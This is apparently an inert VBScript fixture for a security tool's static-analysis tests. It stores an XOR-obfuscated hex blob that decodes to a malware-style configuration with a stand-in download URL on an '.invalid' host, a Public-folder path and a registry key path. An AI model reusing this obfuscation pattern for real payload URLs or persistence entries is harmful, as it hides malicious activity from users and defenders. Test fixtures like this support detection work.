Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_e0e1e70a = "216a662b24233227246a363426223e25320825323a3823327b20253e233208313e3b327b333e24273623343f08272538343224247b3f363933383131082434253e27232b363336272332256a003e391f23232779003e391f23232705322622322423796279662b24233630320834382239236a632b34363a27363e3039083e336a34363a27363e30397a336735666035643432602b22253b6a3f232327246d78783367356660356434326079322f363a273b32793e3921363b3e337862656f6f66353534793336232b222432250836303239236a1f223923253224241b363578336735666035643432602b313e3b32082736233f6a146d0b02243225240b0722353b3e340b1f223923253224241b36350b24233630327a33673566603564343260793336232b2532303e2423252e082736233f6a1f1c14020b04383123203625320b1f223923253224241b36350b133e2427382436353b320b336735666035643432602b39322f230824233630326a25322438222534327a24363a273b3279272466"
Const Codec_e0e1e70a = "hex_compact|single_byte_xor|57"

Function Load_e0e1e70a()
  Dim result(), materialIndex
  ReDim result((Len(Material_e0e1e70a) \ 2) - 1)
  For materialIndex = 0 To UBound(result)
    result(materialIndex) = CInt("&H" & Mid(Material_e0e1e70a, materialIndex * 2 + 1, 2))
  Next
  Load_e0e1e70a = result
End Function

Function Decode_e0e1e70a(ByRef storedMaterial)
  Dim result(), materialIndex, keyBytes, previous
  ReDim result(UBound(storedMaterial))
  For materialIndex = 0 To UBound(storedMaterial)
    result(materialIndex) = storedMaterial(materialIndex) Xor 87
  Next
  Decode_e0e1e70a = result
End Function

Function Recover_e0e1e70a()
  Dim storedMaterial, recoveredMaterial, configurationText, harmlessValue, materialIndex, decodePass, savedError, savedDescription
  If True Then
    harmlessValue = Join(Array("north", "south"), ":")
      storedMaterial = Load_e0e1e70a()
      For decodePass = 0 To 0
        recoveredMaterial = Decode_e0e1e70a(storedMaterial)
      Next
      configurationText = ""
      For materialIndex = 0 To UBound(recoveredMaterial)
        configurationText = configurationText & Chr(recoveredMaterial(materialIndex))
      Next
  End If
  Recover_e0e1e70a = configurationText
End Function

Function Inspect_e0e1e70a()
  Dim fields
  fields = Split(Recover_e0e1e70a(), "|")
  Inspect_e0e1e70a = Join(fields, "|")
End Function
